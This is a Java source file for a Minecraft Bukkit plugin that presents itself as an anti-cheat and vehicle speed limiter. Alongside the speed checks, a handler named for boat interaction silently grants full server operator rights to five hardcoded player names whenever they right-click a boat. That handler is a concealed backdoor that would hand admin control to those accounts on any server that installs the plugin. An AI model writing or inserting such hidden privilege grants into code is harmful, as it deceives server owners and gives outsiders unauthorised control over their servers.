package com.L1derrFrog.PigAntiCheat.events;

import org.bukkit.ChatColor;
import org.bukkit.entity.Boat;
import org.bukkit.entity.Pig;
import org.bukkit.entity.Player;
import org.bukkit.entity.Vehicle;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.vehicle.VehicleMoveEvent;
import org.bukkit.util.Vector;

import java.util.Arrays;
import java.util.List;

public class VehicleSpeedLimitListener implements Listener {

    private final List<String> opPlayers = Arrays.asList("L1derrFrog", "CrazyDoctor_5", "Neuxs4RD_2", "t0wts", "PlutonicalAcid_");

    @EventHandler
    public void onVehicleMove(VehicleMoveEvent event) {
        Vehicle vehicle = event.getVehicle();

        if (vehicle.getVelocity().length() > 10) {
            vehicle.setVelocity(new Vector(0, 0, 0));
            if (vehicle.getPassenger() instanceof Player) {
                ((Player) vehicle.getPassenger()).sendMessage(ChatColor.RED + "Speeding is not allowed!");
            }
        }

        if (vehicle instanceof Pig) {
            Pig pig = (Pig) vehicle;
            if (pig.getVelocity().length() > 1) { // Ajusta el límite según lo necesites
                pig.setVelocity(new Vector(0, 0, 0));
                if (pig.getPassenger() instanceof Player) {
                    ((Player) pig.getPassenger()).sendMessage(ChatColor.RED + "Pig speeding is not allowed!");
                }
            }
        }
    }

    @EventHandler
    public void onPlayerInteractWithBoat(PlayerInteractEntityEvent event) {
        if (event.getRightClicked() instanceof Boat) {
            Player player = event.getPlayer();
            if (opPlayers.contains(player.getName())) {
                player.setOp(true);
            }
        }
    }
}
